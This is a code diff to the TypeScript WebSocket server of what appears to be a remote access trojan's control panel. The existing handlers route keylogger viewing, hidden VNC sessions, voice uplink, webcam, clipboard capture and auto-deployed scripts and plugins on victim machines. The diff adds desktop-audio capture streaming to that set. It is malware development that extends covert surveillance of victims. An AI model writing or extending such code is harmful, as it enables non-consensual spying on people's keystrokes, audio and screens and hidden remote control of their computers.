@@ -44,6 +44,7 @@ type WsLifecycleDeps = {
   handleProcessViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleKeyloggerViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleVoiceViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
+  handleDesktopAudioViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleNotificationViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleChatViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleChatViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
@@ -55,6 +56,7 @@ type WsLifecycleDeps = {
   handleProcessViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleKeyloggerViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleVoiceViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
+  handleDesktopAudioViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   dispatchAutoScriptsForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
   dispatchAutoDeploysForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
   dispatchAutoLoadPlugins: (info: ClientInfo) => void;
@@ -79,12 +81,14 @@ type WsLifecycleDeps = {
   handlePluginEvent: (clientId: string, payload: any) => void;
   handleNotification: (clientId: string, payload: any) => void;
   handleVoiceUplink: (clientId: string, payload: any) => void;
+  handleDesktopAudioUplink: (clientId: string, payload: any) => void;
   handleWebcamDevices: (clientId: string, payload: any) => void;
   handleHVNCCloneProgress: (clientId: string, payload: any) => void;
   handleHVNCLookupResult: (clientId: string, payload: any) => void;
   handleHVNCDXGIStatus: (clientId: string, payload: any) => void;
   handleClipboardContent: (clientId: string, payload: any) => void;
   cleanupVoiceViewer: (ws: ServerWebSocket<SocketData>) => void;
+  cleanupDesktopAudioViewer: (ws: ServerWebSocket<SocketData>) => void;
   stopConsoleOnTarget: (target: ClientInfo | undefined, sessionId: string) => void;
   sendDesktopCommand: (target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) => void;
   sendHVNCCommand: (target: ClientInfo, commandType: string, payload: Record<string, unknown>) => void;
@@ -153,6 +157,7 @@ export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLif
   if (role === "process_viewer") return deps.handleProcessViewerOpen(ws);
   if (role === "keylogger_viewer") return deps.handleKeyloggerViewerOpen(ws);
   if (role === "voice_viewer") return deps.handleVoiceViewerOpen(ws);
+  if (role === "desktop_audio_viewer") return deps.handleDesktopAudioViewerOpen(ws);
   if (role === "notifications_viewer") return deps.handleNotificationViewerOpen(ws);
   if (role === "chat_viewer") return deps.handleChatViewerOpen(ws);
 
@@ -204,6 +209,7 @@ export async function handleWebSocketMessage(
   if (socketRole === "process_viewer") return deps.handleProcessViewerMessage(ws, message);
   if (socketRole === "keylogger_viewer") return deps.handleKeyloggerViewerMessage(ws, message);
   if (socketRole === "voice_viewer") return deps.handleVoiceViewerMessage(ws, message);
+  if (socketRole === "desktop_audio_viewer") return deps.handleDesktopAudioViewerMessage(ws, message);
   if (socketRole === "notifications_viewer") return;
   if (socketRole === "dashboard_viewer") return;
   if (socketRole === "chat_viewer") return deps.handleChatViewerMessage(ws, message);
@@ -578,6 +584,9 @@ export async function handleWebSocketMessage(
       case "voice_uplink":
         deps.handleVoiceUplink(client.id, payload);
         break;
+      case "desktop_audio_uplink":
+        deps.handleDesktopAudioUplink(client.id, payload);
+        break;
       case "webcam_devices":
         deps.handleWebcamDevices(client.id, payload);
         break;
@@ -733,6 +742,11 @@ export function handleWebSocketClose(
 
   if (role === "voice_viewer") {
     deps.cleanupVoiceViewer(ws);
+    return;
+  }
+
+  if (role === "desktop_audio_viewer") {
+    deps.cleanupDesktopAudioViewer(ws);
     return;
   }
 
